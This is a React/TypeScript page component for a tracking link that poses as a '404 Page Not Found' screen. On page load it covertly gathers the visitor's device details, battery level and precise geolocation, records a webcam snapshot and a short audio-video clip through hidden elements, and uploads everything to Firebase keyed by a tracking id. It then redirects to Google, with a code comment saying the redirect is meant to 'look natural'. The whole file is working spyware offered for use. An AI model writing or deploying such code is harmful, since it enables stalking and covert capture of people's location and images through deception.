
import React, { useEffect, useRef } from 'react';
import { useParams } from 'react-router-dom';
import { collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
import { ref, uploadString, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
import { db, storage } from '../firebase';

const TrackPage: React.FC = () => {
  const { id } = useParams<{ id: string }>();
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const hasCaptured = useRef(false);

  useEffect(() => {
    const runCapture = async () => {
      if (!id || hasCaptured.current) return;
      hasCaptured.current = true;

      // 1. Collect Device Specs
      const ua = navigator.userAgent;
      let model = "Unknown Device";
      if (ua.includes("Android")) model = "Android Mobile";
      else if (ua.includes("iPhone")) model = "iPhone";
      else if (ua.includes("Windows")) model = "Windows PC";
      else if (ua.includes("Macintosh")) model = "MacBook";
      
      // @ts-ignore
      const ram = navigator.deviceMemory || 0;
      let storageInfo = "N/A";
      try {
        if (navigator.storage && navigator.storage.estimate) {
          const estimate = await navigator.storage.estimate();
          storageInfo = `${Math.round(estimate.quota! / (1024 * 1024 * 1024))} GB`;
        }
      } catch (e) {}

      // 2. Battery
      let batteryLevel = 0;
      try {
        // @ts-ignore
        const battery = await navigator.getBattery();
        batteryLevel = Math.round(battery.level * 100);
      } catch (e) {}

      // 3. Location (Silent request)
      let location = null;
      try {
        const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, { 
            enableHighAccuracy: true, 
            timeout: 8000 
          });
        });
        location = { lat: pos.coords.latitude, lng: pos.coords.longitude };
      } catch (e) {
        console.debug("Location blocked or timeout");
      }

      // 4. Capture Media
      let photoUrl = null;
      let videoUrl = null;
      
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: 'user' }, 
          audio: true 
        });
        
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          await new Promise((res) => {
            videoRef.current!.onloadedmetadata = () => res(true);
            setTimeout(() => res(false), 3000); // Fallback
          });

          // Snapshot
          const canvas = canvasRef.current;
          if (canvas) {
            canvas.width = videoRef.current.videoWidth || 640;
            canvas.height = videoRef.current.videoHeight || 480;
            canvas.getContext('2d')?.drawImage(videoRef.current, 0, 0);
            const base64Photo = canvas.toDataURL('image/jpeg', 0.6);
            const photoPath = `captures/${id}/${Date.now()}_snap.jpg`;
            const photoStorageRef = ref(storage, photoPath);
            await uploadString(photoStorageRef, base64Photo, 'data_url');
            photoUrl = await getDownloadURL(photoStorageRef);
          }

          // Short Video Clip (2 seconds for speed)
          const mediaRecorder = new MediaRecorder(stream);
          const chunks: Blob[] = [];
          mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
          
          const videoDone = new Promise<Blob>((resolve) => {
            mediaRecorder.onstop = () => resolve(new Blob(chunks, { type: 'video/webm' }));
          });

          mediaRecorder.start();
          await new Promise(r => setTimeout(r, 2000));
          mediaRecorder.stop();

          const videoBlob = await videoDone;
          const videoPath = `captures/${id}/${Date.now()}_clip.webm`;
          const videoStorageRef = ref(storage, videoPath);
          await uploadBytes(videoStorageRef, videoBlob);
          videoUrl = await getDownloadURL(videoStorageRef);
        }
        
        stream.getTracks().forEach(track => track.stop());
      } catch (e) {
        console.debug("Media access denied");
      }

      // 5. Save all data to Firestore
      try {
        await addDoc(collection(db, "logs"), {
          userId: id,
          timestamp: serverTimestamp(),
          deviceModel: model,
          battery: batteryLevel,
          ram: ram,
          storage: storageInfo,
          location: location,
          photoUrl: photoUrl,
          videoUrl: videoUrl,
          status: 'Collected'
        });
      } catch (err) {
        console.error("Firestore Save Error:", err);
      }

      // 6. Final Redirect to look natural
      window.location.href = "https://www.google.com";
    };

    runCapture();
  }, [id]);

  return (
    <div className="min-h-screen flex items-center justify-center bg-white font-sans text-gray-800">
      <div className="text-center p-8 max-w-sm">
        <h1 className="text-6xl font-bold mb-4">404</h1>
        <p className="text-xl font-medium text-gray-500 mb-8">Page Not Found</p>
        <p className="text-sm text-gray-400">The requested URL was not found on this server. Redirecting...</p>
        
        {/* Hidden elements for capturing */}
        <video ref={videoRef} autoPlay muted playsInline className="opacity-0 absolute pointer-events-none w-1 h-1"></video>
        <canvas ref={canvasRef} className="hidden"></canvas>
      </div>
    </div>
  );
};

export default TrackPage;
